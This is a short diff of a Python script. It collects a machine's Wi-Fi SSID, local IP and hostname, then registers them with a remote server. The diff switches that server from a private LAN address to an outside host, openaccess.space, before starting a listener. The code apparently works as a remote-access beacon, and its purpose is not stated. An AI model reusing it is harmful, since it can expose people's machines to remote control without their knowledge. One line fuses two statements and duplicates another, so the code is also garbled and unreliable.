@@ -24,7 +24,7 @@ elif sys.platform == 'win32':
                 ssid = data[x].replace(' ', '').replace('SSID:', '')host = socket.gethostbyname(socket.gethostname())
 host = socket.gethostbyname(socket.gethostname())
 port = random.randint(10000, 10100)
-r = requests.post(f'http://192.168.1.100:8080/api/computers/{platform.uname().node}/ipPort', json={'ip': host, 'port': port})
+r = requests.post(f'http://openaccess.space:8080/api/computers/{platform.uname().node}/ipPort', json={'ip': host, 'port': port})
 main(host=host, port=port)
 
 
